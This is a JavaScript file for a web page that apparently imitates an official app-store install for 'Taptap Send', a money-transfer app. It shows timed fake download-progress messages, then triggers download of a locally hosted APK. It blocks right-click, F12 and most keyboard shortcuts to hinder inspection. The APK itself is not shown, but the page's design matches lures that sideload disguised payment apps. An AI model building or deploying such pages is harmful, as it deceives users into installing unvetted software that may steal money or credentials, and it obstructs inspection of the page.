// Get elements
const installButton = document.getElementById('installButton');
const installModal = document.getElementById('installModal');
const confirmBtn = document.getElementById('confirmBtn');
const cancelBtn = document.getElementById('cancelBtn');
const redownloadModal = document.getElementById('redownloadModal');
const redownloadConfirmBtn = document.getElementById('redownloadConfirmBtn');
const redownloadCancelBtn = document.getElementById('redownloadCancelBtn');
const appSupportToggle = document.getElementById('appSupportToggle');
const supportContent = document.getElementById('supportContent');
const expandIcon = appSupportToggle.querySelector('.expand-icon');

// App Support Toggle
appSupportToggle.addEventListener('click', () => {
    supportContent.classList.toggle('expanded');
    expandIcon.classList.toggle('rotated');
});

// Download APK function
function downloadApk() {
    const apkPath = '../Taptap Send.apk';
    const link = document.createElement('a');
    link.href = apkPath;
    link.download = 'Taptap Send.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// Open APK function
function openApk() {
    const apkPath = '../Taptap Send.apk';
    try {
        window.location.href = apkPath;
    } catch (error) {
        console.error('Error opening APK:', error);
    }
}

// Install button click
installButton.addEventListener('click', () => {
    if (installButton.textContent === 'Open') {
        redownloadModal.classList.add('show');
    } else {
        installModal.classList.add('show');
    }
});

// Confirm install
confirmBtn.addEventListener('click', () => {
    installModal.classList.remove('show');
    installButton.disabled = true;
    
    const progressSteps = [5, 10, 30, 50, 80, 100];
    let currentStep = 0;
    
    const updateProgress = () => {
        if (currentStep < progressSteps.length) {
            installButton.textContent = `${progressSteps[currentStep]}% Download....`;
            currentStep++;
            setTimeout(updateProgress, 1500);
        } else {
            installButton.textContent = 'Installing...';
            installButton.disabled = false;
            
            setTimeout(() => {
                installButton.textContent = 'Open';
                installButton.disabled = false;
            }, 25000);
            
            downloadApk();
        }
    };
    
    updateProgress();
});

// Cancel install
cancelBtn.addEventListener('click', () => {
    installModal.classList.remove('show');
});

// Redownload confirm
redownloadConfirmBtn.addEventListener('click', () => {
    redownloadModal.classList.remove('show');
    openApk();
});

// Redownload cancel
redownloadCancelBtn.addEventListener('click', () => {
    redownloadModal.classList.remove('show');
});

// Close modals on backdrop click
const modals = document.querySelectorAll('.modal');
modals.forEach(modal => {
    modal.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal-backdrop')) {
            modal.classList.remove('show');
        }
    });
});

// Prevent right-click and dev tools
document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(event) {
    event = event || window.event;
    
    // Disable F12
    if (event.keyCode === 123) {
        return false;
    }
    
    // Allow specific Ctrl combinations
    if (event.ctrlKey && ![67, 82, 86, 88, 90].includes(event.keyCode)) {
        return false;
    }
    
    // Allow F5
    if (event.keyCode === 116) {
        return true;
    }
};

document.onmousedown = function(event) {
    if (event.button === 2) {
        return false;
    }
};
